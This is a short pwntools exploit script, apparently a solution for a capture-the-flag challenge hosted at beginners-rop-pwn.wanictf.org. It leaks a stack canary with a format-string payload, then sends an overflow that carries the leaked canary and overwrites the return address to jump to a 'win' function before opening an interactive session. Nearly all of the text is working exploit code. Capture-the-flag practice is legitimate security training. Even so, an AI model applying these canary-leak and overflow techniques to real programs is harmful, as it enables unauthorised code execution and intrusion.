from pwn import *

#p = process("./chall")
p = remote("beginners-rop-pwn.wanictf.org", 9006)
#p = gdb.debug('./chall', '''
#break *main
#break *main+12
#break *main+139
#break *main+150
#break *main+155
#''')


canary_leak = b'%29$p'


# Canary Leak
p.recvuntil(': ')
p.sendline(canary_leak)
canary_value = p.recvn(18).decode('utf-8')
canary_int = int(canary_value.rstrip(),16)
p.recvline()
print('Leaked Canary: ', canary_value)

padA = b'A' * 24
padB = b'B' * 8     # rbp
padC = b'C' * 8 
win = 0x40123d

# Padding - Overflow
p.sendline(padA + p64(canary_int) + padB + p64(win) + padC)
p.recvline()

# Exploit
p.sendline("YES")
p.interactive()
